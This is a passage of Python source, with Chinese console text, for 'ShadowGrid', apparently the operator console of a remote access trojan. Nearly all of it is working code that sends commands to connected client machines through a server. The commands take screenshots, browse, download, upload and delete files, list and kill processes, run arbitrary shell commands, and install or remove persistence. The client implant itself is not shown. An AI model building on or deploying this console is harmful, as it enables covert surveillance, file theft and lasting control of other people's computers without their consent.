        elif cmd == "screenshot":
            send_command(client_id, "screenshot")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "screenshot":
                        img_data = r.get("result", "")
                        filename = r.get("filename", "shot.png")
                        try:
                            # 解码图片数据
                            img_bytes = base64.b64decode(img_data)
                            img_size = len(img_bytes)
                            # 计算 MD5 校验和
                            import hashlib
                            img_hash = hashlib.md5(img_bytes).hexdigest()
                            # 显示进度条动画
                            print(f"\r{LGREEN}[传输中]{RESET} 截图数据...", end="", flush=True)
                            time.sleep(0.05)
                            progress = create_progress_bar(img_size, img_size, label="传输", style="simple")
                            print(f"\r{progress}{RESET}", flush=True)
                            # 保存图片
                            os.makedirs("screenshots", exist_ok=True)
                            save_path = os.path.join("screenshots", f"{client_id}_{get_timestamp()}_{filename}")
                            with open(save_path, "wb") as f:
                                f.write(img_bytes)
                            # 验证文件完整性
                            with open(save_path, "rb") as f_verify:
                                saved_hash = hashlib.md5(f_verify.read()).hexdigest()
                            if img_hash == saved_hash:
                                print(f"{LGREEN}[完成]{RESET} 截图已保存：{CYAN}{save_path}{RESET} (校验：√)")
                                print(f"{LGREEN}[统计]{RESET} 大小：{format_file_size(img_size)}, MD5: {PURPLE}{img_hash[:8]}...{img_hash[-8:]}{RESET}")
                            else:
                                print(f"{RED}[✗ 校验]{RESET} 文件完整性校验失败 - 截图可能损坏")
                                print(f"{CYAN}[结果]{RESET} 截图已保存 (可能需要重新截取): {CYAN}{save_path}{RESET}")
                        except Exception as e:
                            print(f"{RED}[错误]{RESET} 无法保存截图：{DRED}{e}{RESET}")
                    elif r.get("result_type") == "error":
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败：{e}")
                return
        elif cmd == "dl":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法：dl <文件路径> [保存目录]")
                continue
            parts = arg.split(maxsplit=1)
            file_path = parts[0]
            save_dir = parts[1] if len(parts) > 1 else "downloads"
            os.makedirs(save_dir, exist_ok=True)
            # 获取文件信息来检查大小
            send_command(client_id, "dl", {"path": file_path, "save_as": ""})
            results = wait_for_result(client_id)
            if results:
                r = results[0]
                # 检查是否是大文件通知，需切换到流式传输
                if r.get("result_type") == "large_file":
                    file_size = r.get("file_size", 0)
                    print(f"{YELLOW}[提示]{RESET} 检测到大文件 ({format_file_size(file_size)})，自动启用流式传输...")
                    download_path = os.path.join(save_dir, os.path.basename(file_path))
                    success = stream_download_file(client_id, file_path, download_path)
                    if success:
                        print(f"{LGREEN}[完成]{RESET} 大文件完整校验：√")
                elif r.get("result_type") == "file":
                    # 标准下载处理
                    import hashlib
                    file_bytes = base64.b64decode(r.get("result", ""))
                    # Calculate file hash for later comparison
                    file_hash = hashlib.md5(file_bytes).hexdigest()
                    file_size = len(file_bytes)
                    save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
                    with open(save_path, "wb") as f:
                        f.write(bytearray(file_bytes))
                    # Create animated progress bar effect for small files - 使用通用函数
                    print(f"\r{LGREEN}[下载]{RESET} {progress_line}{RESET}", flush=True)
                    # Verify file integrity using the calculated hash and local file hash
                    local_file_hash = hashlib.md5()
                    with open(save_path, "rb") as f_verify:
                        while True:
                            chunk = f_verify.read(1024*512)  # 512KB chunks
                            if not chunk:
                                break
                            local_file_hash.update(chunk)
                    local_hash = local_file_hash.hexdigest()
                    if local_hash == file_hash:
                        print(f"{CYAN}[完成]{RESET} 文件已下载：{CYAN}{save_path}{RESET} (校验：√)")
                        print(f"{LGREEN}[统计]{RESET} 文件：{format_file_size(file_size)}")
                    else:
                        print(f"{RED}[✗ 校验]{RESET} 文件完整性校验失败 - 文件可能损坏")
                        print(f"{CYAN}[结果]{RESET} 文件已下载 (需要重新下载): {CYAN}{save_path}{RESET}")
                else:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败：{e}")
                return
        elif cmd == "ls":
            full_path = arg if arg else CURRENT_PATH
            full_path = os.path.normpath(full_path)
            send_command(client_id, "ls", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    format_ls_output(r.get("result", []))
                print(RESET, end="")  # Reset colors after ls output
                print(RESET, end="")  # Reset colors after ls output
            else:
                # 没有获取到结果，可能是命令执行时间长，所以我们先确认客户端是否真的掉线
                if not check_client_online(client_id):
                    # 确认客户端真的不是在线的
                    print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                    CURRENT_DEVICE = None
                    CURRENT_HOSTNAME = ""
                    print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                    try:
                        fetch_clients()
                        if CLIENTS:
                            print_clients()
                        else:
                            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                    except Exception as e:
                        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                    return
                else:
                    # 客户端仍然在线，只是命令执行时间较长
                    print(f"{YELLOW}[信息]{RESET} 命令仍在执行，请稍候...")
        elif cmd == "cd":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: cd <目录>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cd", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "dir":
                        CURRENT_PATH = full_path
                        print(f"{LGREEN}[结果]{RESET} 已切换到目录 {CYAN}{CURRENT_PATH}{RESET}")
                        print(RESET, end="")  # Reset terminal
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败：{e}")
                return  # 只在客户端下线时返回
        elif cmd == "ud":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: ud <本地文件> [远程目录]")
                continue
            parts = arg.split(maxsplit=1)
            local_file = parts[0]
            remote_dir = parts[1] if len(parts) > 1 else "."
            if not os.path.isfile(local_file):
                print(f"{RED}[错误]{RESET} 本地文件未找到")
                continue
            # 获取本地文件大小
            file_size = os.path.getsize(local_file)
            size_mb = file_size / (1024 * 1024)  # MB单位
            print(f"{LGREEN}[信息]{RESET} 准備上傳: {CYAN}{local_file}{RESET} ({format_file_size(file_size)})")
            # 检查文件是否很大 (>0.5MB，即512KB)
            if file_size > 1024 * 512:  # 512KB
                print(f"{YELLOW}[提示]{RESET} 文件过大({format_file_size(file_size)})，自动启用流式传输...")
                remote_filename = os.path.join(remote_dir, os.path.basename(local_file))
                stream_upload_file(client_id, local_file, remote_filename)
            else:
                # 对于小文件，显示美观的进度条 - 首先计算文件 hash
                import hashlib
                # Calculate local file hash for verification
                file_hash_calc = hashlib.md5()
                with open(local_file, "rb") as f:
                    while True:
                        chunk = f.read(1024 * 512)  # 512KB chunks
                        if not chunk:
                            break
                        file_hash_calc.update(chunk)
                original_hash = file_hash_calc.hexdigest()
                # 显示进度条动画 - 使用通用函数
                progress_line = create_progress_bar(0, file_size, label="上传", style="animated")
                animation_step = 0
                for i in range(3):
                    print(f"\r{LGREEN}[上传]{RESET} {progress_line}{RESET}", end="", flush=True)
                    time.sleep(0.1)
                    animation_step += 1
                    # 更新进度显示
                    progress_line = create_progress_bar((i+1) * file_size // 3, file_size, label="上传", style="animated")
                # 普通方式上传小文件
                with open(local_file, "rb") as f:
                    base64_data = base64.b64encode(f.read()).decode()
                save_as = os.path.join(remote_dir, os.path.basename(local_file)) if remote_dir != "." else os.path.basename(local_file)
                send_command(client_id, "ud", {
                    "base64_data": base64_data, 
                    "save_as": save_as,
                    "size": file_size,  # 提供文件大小方便客户端决策
                    "is_stream_upload": False  # 标示是否使用流式传输
                })
                results = wait_for_result(client_id)
                if results:
                    for r in results:
                        result_type = r.get("result_type", "")
                        if "error" in result_type.lower() or r.get("status") == "error":
                            print(f"\n{RED}[✗ 上传失败]{RESET}")
                            print_failed_result(r)
                        else:
                            # Display progress bar for small upload completion - 使用通用函数
                            progress_line = create_progress_bar(file_size, file_size, label="上传", style="simple")
                            print(f"\r{LGREEN}[完成]{RESET} {progress_line}{RESET}")
                            # Verify with server response if available
                            if r.get("result_type") == "ok":
                                print(f"{LGREEN}[统计]{RESET} 文件：{CYAN}{save_as}{RESET}, 大小：{format_file_size(file_size)}")
                            else:
                                print(f"{LGREEN}[统计]{RESET} 文件：{CYAN}{save_as}{RESET}")
                else:
                    # 检测到客户端下线
                    print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                    CURRENT_DEVICE = None
                    CURRENT_HOSTNAME = ""
                    print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                    try:
                        fetch_clients()
                        if CLIENTS:
                            print_clients()
                        else:
                            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                    except Exception as e:
                        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                    return
        elif cmd == "rm":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: rm <路径> [-r]")
                continue
            recursive = arg.endswith(" -r")
            path = arg[:-3] if recursive else arg
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, path))
            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "mv":
            if not arg or len(arg.split()) < 2:
                print(f"{RED}[错误]{RESET} 用法: mv <源> <目标>")
                continue
            parts = arg.split(maxsplit=1)
            src, dst = parts[0], parts[1]
            full_src = os.path.normpath(os.path.join(CURRENT_PATH, src))
            full_dst = os.path.normpath(os.path.join(CURRENT_PATH, dst))
            send_command(client_id, "mv", {"from_path": full_src, "to_path": full_dst})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                     print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "find":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: find <模式> [-t 类型]")
                continue
            parts = arg.split()
            pattern = None
            file_type = None
            i = 0
            while i < len(parts):
                if parts[i] == "-t" and i + 1 < len(parts):
                    file_type = parts[i + 1]
                    i += 1
                else:
                    if not pattern:
                        pattern = parts[i]
                i += 1
            if not pattern:
                print(f"{RED}[错误]{RESET} 用法: find <模式> [-t 类型]")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, pattern))
            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "list":
                        for item in r.get("result", []):
                            item_type = item.get("type", "")
                            item_path = item.get("path", "")
                            if item_type.lower() == "dir":
                                print(f"  {LGREEN}[{item_type.upper()}]{RESET} {CYAN}{item_path}{RESET}")
                            else:
                                print(f"  {YELLOW}[{item_type.upper()}]{RESET} {item_path}")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd in ("ps", "process"):
            send_command(client_id, "ps")
            results = wait_for_result(client_id, timeout=5.0)
            if results:
                for r in results:
                    if r.get("result_type") == "process_list":
                        processes = r.get("result", [])
                        print(f"\n{YELLOW}PID{RESET}    {YELLOW}NAME{RESET}{' ' * 20} {YELLOW}USERNAME{RESET}")
                        print("-" * 60)
                        for proc in processes:
                            pid = proc.get('pid', 'N/A') if isinstance(proc, dict) else 'N/A'
                            name = proc.get('name', 'N/A')[:20] if isinstance(proc, dict) else 'N/A' # 限制进程名长度
                            username = proc.get('username', 'N/A') if isinstance(proc, dict) else 'N/A'
                            status = proc.get('status', '') if isinstance(proc, dict) else ''
                            # 确保所有值都不是None
                            pid = pid if pid is not None else 'N/A'
                            name = name if name is not None else 'N/A'
                            username = username if username is not None else 'N/A'
                            status = status if status is not None else ''
                            print(f"{CYAN}{pid:<8}{RESET} {name:<22} {username:<15}")
                        print(f"\n{LGREEN}[结果]{RESET} Found {len(processes)} processes\n")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "shell":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: shell <命令>")
                continue
            send_command(client_id, "shell", arg)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "shell":
                        output = r.get("result", "")
                        print(f"{LGREEN}[结果]{RESET}")
                        print(f"{DCYAN}{output}{RESET}")
                        print(RESET, end="")  # Reset terminal
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd in ("kill", "terminate"):
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: kill <PID>")
                continue
            try:
                pid = int(arg)
                send_command(client_id, "kill", {"pid": pid})
                results = wait_for_result(client_id)
                if results:
                    for r in results:
                        print_failed_result(r)
                else:
                    # 没有获取到结果，可能是命令执行时间长，所以我们先确认客户端是否真的掉线
                    if not check_client_online(client_id):
                        # 确认客户端真的不是在线的
                        print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                        CURRENT_DEVICE = None
                        CURRENT_HOSTNAME = ""
                        print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                        try:
                            fetch_clients()
                            if CLIENTS:
                                print_clients()
                            else:
                                print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                        except Exception as e:
                            print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                        return
                    else:
                        # 客户端仍然在线，只是命令执行时间较长
                        print(f"{YELLOW}[信息]{RESET} 命令仍在执行，请稍候...")
            except ValueError:
                print(f"{RED}[错误]{RESET} PID必须是有效整数")
        elif cmd in ("persist", "install"):
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: persist <install|remove> [参数]")
                continue
            parts = arg.split(maxsplit=1)
            action = parts[0].lower()
            param = parts[1] if len(parts) > 1 else ""
            payload = {"action": action}
            if action == "install" and param:
                payload["path"] = param
            send_command(client_id, "persist", payload)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "help":
            print_help()
        else:
            print(f"{RED}[错误]{RESET} 未知命令: {cmd}")
def save_config(config_dict):
    """保存配置到文件"""
    try:
        if not CONFIG_DIR.exists():
            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        config_parser = configparser.ConfigParser()
        config_parser['shadowgrid'] = {}
        for key, value in config_dict.items():
            config_parser.set('shadowgrid', key, str(value))
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            config_parser.write(f)
    except Exception:
        pass  # 配存失败不影响正常使用
def apply_readline_history(cmd_input):
    """将命令添加到readline历史，如果可用"""
    if HAS_READLINE and cmd_input and not cmd_input.lower().startswith(("history", "!!")):
        import readline
        readline.add_history(cmd_input)
        CMD_HISTORY.append(cmd_input)
    elif not HAS_READLINE and cmd_input and not cmd_input.lower().startswith(("history", "!!")):
        CMD_HISTORY.append(cmd_input)
def add_settings_command_logic():
    """检查并执行settings命令的相关逻辑"""
    import sys
    args = []
    if len(sys.argv) > 1:
        args = sys.argv[1:]
    if args and args[0] in ['setting', 'settings', 'config', 'conf']:
        print(f"{LGREEN}[设置]{RESET} ShadowGrid 配置管理:")
        print("  server_url    - 服务器地址")
        print("  last_password  - 上次保存的密码（隐私）")
        print("  last_client_id - 最后连接的客户端ID") 
        print("  last_hostname - 最后使用的主机名")
        print("  auto_remember_password - 自动记住密码（true/false）")
        print("  current       - 所有当前配置")
        print("  reset         - 重置所有配置")
        print("  clear_hist    - 清空命令历史")
        if len(args) > 1:
            setting_name = args[1]
            if setting_name == "server_url":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('server_url', '未设置')}")
            elif setting_name == "last_client_id":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_client_id', '未设置')}")
            elif setting_name == "last_hostname":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_hostname', '未设置')}")
            elif setting_name == "auto_remember_password":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('auto_remember_password', 'false')}")
            elif setting_name == "current":
                print(f"{CYAN}[当前配置]{RESET}")
                for key, value in CONFIG.items():
                    if key != 'last_password':  # 隐私考虑，不显示密码
                        print(f"  {CYAN}{key}{RESET}: {YELLOW}{value}{RESET}")
            elif setting_name == "reset":
                CONFIG.clear()
                CONFIG.update({
                    "server_url": "",
                    "last_password": "",
                    "last_client_id": "",
                    "last_hostname": "",
                    "auto_remember_password": "false",
                })
                save_config(CONFIG)
                print(f"{LGREEN}[结果]{RESET} 配置已重置")
            elif setting_name == "clear_hist":
                CMD_HISTORY.clear()
                if HAS_READLINE:
                    import readline
                    readline.clear_history()
                save_history()
                print(f"{LGREEN}[结果]{RESET} 历史记录已清空")
        return True
    return False
def show_splash():
    """显示启动画面"""
    try:
        import splash
        print(splash.get_splash())
    except:
        print("""
  ╔══════════════════════════════════════╗
  ║            SHADOWGRID v1.0           ║
  ║      远程管理系统 - 暗影矩阵         ║
  ╚══════════════════════════════════════╝
        """)
def main():
    """主函数"""
    # 加载配置和命令历史
    load_config()
    # 检查是否存在设置命令参数
    if add_settings_command_logic():
        return
    show_splash()
    print("[信息] ShadowGrid Admin Console v1.0")
    prompt_config()
    if not login():
        print("[错误] 登录失败次数过多")
        sys.exit(1)
    # 登录成功后自动刷新设备列表
    print(f"{LGREEN}[信息]{RESET} 获取设备列表...")
    try:
        fetch_clients()
        if CLIENTS:
            print_clients()
        else:
            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
    except Exception as e:
        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
    print(f"{LGREEN}[信息]{RESET} 输入 '{YELLOW}help{RESET}' 查看可用命令")
    while True:
        try:
            cmd_input = input(f"{BLUE}srt{RESET}{GRAY}>{RESET} ").strip()
        except EOFError:
            print(f"\n{GRAY}[信息]{RESET} 退出中...")
            break
        except KeyboardInterrupt:
            print(f"\n{GRAY}[信息]{RESET} 使用 '{YELLOW}quit{RESET}' 退出")
            continue
        # 添加命令到历史记录（如果不是历史相关命令，防止混乱）
        apply_readline_history(cmd_input)
        if not cmd_input:
            continue
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        if cmd == "quit":
            print(f"{GRAY}[信息]{RESET} 退出中...")
            break
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "use":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: use <编号>")
                continue
            try:
                num = int(arg)
                if num < 1 or num > len(CLIENTS):
                    print(f"{RED}[错误]{RESET} 无效的设备编号")
                    continue
                selected = CLIENTS[num - 1]
                # 保存当前选中的客户端ID和主机名到配置
                CONFIG["last_client_id"] = selected.get("id")
                CONFIG["last_hostname"] = selected.get("hostname", "")
                save_config(CONFIG)
                interaction_loop(selected.get("id"), selected.get("hostname"))
            except ValueError:
                print(f"{RED}[错误]{RESET} 无效的设备编号")
        elif cmd == "clear":
            clear_screen()
        elif cmd == "history":
            # 判断参数
            if arg == "-c" or arg == "clear":
                CMD_HISTORY.clear()
                if HAS_READLINE:
                    import readline
                    readline.clear_history()
                save_history()
                print(f"{LGREEN}[历史]{RESET} 命令历史已清空")
            else:
                print(f"{LGREEN}┌─[ 命令历史 ]{RESET}")
                for i, cmd in enumerate(CMD_HISTORY[-20:], 1):  # 最近20条命令
                    print(f"{BLUE}  {i:2}. {RESET}{cmd}")
                print(f"{BLUE}└────────────{RESET}")
        elif cmd == "!!":  # 执行上次的命令
            if CMD_HISTORY:
                last_cmd = CMD_HISTORY[-1]
                print(f"{LGREEN}[执行]{RESET} {last_cmd}")
                print(f"{YELLOW}[提示]{RESET} !!命令重新执行功能待完善，可手动输入历史命令")
            else:
                print(f"{GRAY}[历史]{RESET} 没有历史命令")
        # 智能补全命令
        elif cmd == "compgen":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: compgen <part_of_cmd>")
            else:
                # 自动补全常见命令
                all_cmds = ["list", "use", "back", "clear", "history", "!!", 
                           "help", "quit", "screenshot", "ls", "cd", "pwd", 
                           "cat", "dl", "ud", "rm", "mv", "file", "find", 
                           "shell", "ps", "process", "kill", "terminate", 
                           "persist", "install", "setting", "settings", "config"]
                matching_cmds = [c for c in all_cmds if c.startswith(arg)]
                if matching_cmds:
                    print(f"{GREEN}[补全结果]{RESET}")
                    for m in matching_cmds:
                        print(f"  {YELLOW}{m}{RESET}")
                else:
                    print(f"{GRAY}[补全]{RESET} 未找到匹配的命令")
        # 设置命令 - 在这里添加设置命令
        elif cmd in ["setting", "settings", "config", "conf"]:
            if not arg:
                print(f"{LGREEN}[设置]{RESET} ShadowGrid 配置管理:")
                print("  server_url    - 服务器地址")
                print("  last_client_id - 最后连接的客户端ID") 
                print("  last_hostname - 最后使用的主机名")
                print("  auto_remember_password - 自动记住密码（true/false）")
                print("  current       - 所有当前配置")
                print("  reset         - 重置所有配置")
                print("  clear_hist    - 清空命令历史")
            else:
                setting_name = arg.split()[0] if arg else arg
                if setting_name == "server_url":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('server_url', '未设置')}")
                elif setting_name == "last_client_id":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_client_id', '未设置')}")
                elif setting_name == "last_hostname":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_hostname', '未设置')}")
                elif setting_name == "auto_remember_password":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('auto_remember_password', 'false')}")
                elif setting_name == "current":
                    print(f"{CYAN}[当前配置]{RESET}")
                    for key, value in CONFIG.items():
                        if key != 'last_password':  # 隐私考虑，不显示密码
                            print(f"  {CYAN}{key}{RESET}: {YELLOW}{value}{RESET}")
                elif setting_name == "reset":
                    CONFIG.clear()
                    CONFIG.update({
                        "server_url": "",
                        "last_password": "",
                        "last_client_id": "",
                        "last_hostname": "",
                        "auto_remember_password": "false",
                    })
                    save_config(CONFIG)
                    print(f"{LGREEN}[结果]{RESET} 配置已重置")
                elif setting_name == "clear_hist":
                    CMD_HISTORY.clear()
                    if HAS_READLINE:
                        import readline
                        readline.clear_history()
                    save_history()
                    print(f"{LGREEN}[结果]{RESET} 历史记录已清空")
                else:
                    print(f"{RED}[错误]{RESET} 未知设置项: {setting_name}")
        else:
            print(f"{RED}[错误]{RESET} 未知命令: {cmd}。使用 '{YELLOW}help{RESET}' 查看命令列表。")
if __name__ == "__main__":
    try:
        main()
    finally:
        # 退出时保存命令历史记录
        save_history()